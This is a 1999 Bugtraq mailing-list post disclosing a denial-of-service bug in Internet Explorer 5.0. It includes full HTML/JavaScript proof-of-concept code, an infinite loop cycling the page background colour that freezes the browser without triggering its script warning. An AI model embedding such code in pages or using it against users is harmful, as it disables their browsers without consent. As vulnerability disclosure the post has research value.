Date: Mon, 31 May 1999 16:18:02 GMT
From: THR - <thr_@HOTMAIL.COM>
To: BUGTRAQ@netspace.org
Subject: Exploit in Internet Explorer 5.0

Hi everyone!


I have found a bug which will freeze Internet Explorer 5.0
I know that there are *many* bugs that will crasch browsers
but what makes this one special is the following:

In IE 5.0 Microsoft has fixed the bugs from IE 4.0 that
was based on infinit loops in JavaScript. If a JavaScript
contains a loop which will cause IE 5.0 to run slowly
or be unresponsive, the user will be warned and he/she will
be prompted whether the JavaScript should be aborted or
not. This exploit is a JavaScript which changes the bgColor in
an infinit loop and when you open it you wont get a warning.
The browser will just freeze!
Get the source code here: http://members.xoom.com/thr_/my/color.txt


//THR
         WWW: http://fly.to/unixhacking

---------------------------------------------------------------------

<http://members.xoom.com/thr_/my/color.txt>

24/5 1999

This is a new exploit which affects Microsoft Internet Explorer 5.0.
When you enter the html document below, IE will freeze and you have to 
close it with ctrl + alt + del.

//THR
        WWW:  http://fly.to/unixhacking


-----------Cut here------color.htm--------Start---------

<HTML>
<BODY>
<SCRIPT>
 
var color = new Array;
color[1] = "black";
color[2] = "white";

for(x = 0; x <3; x++)
{
        document.bgColor = color[x]
        if(x == 2)
        {
                x = 0;
        }               
}


</SCRIPT>
</BODY>
</HTML>

-----------Cut here------color.htm--------End---------
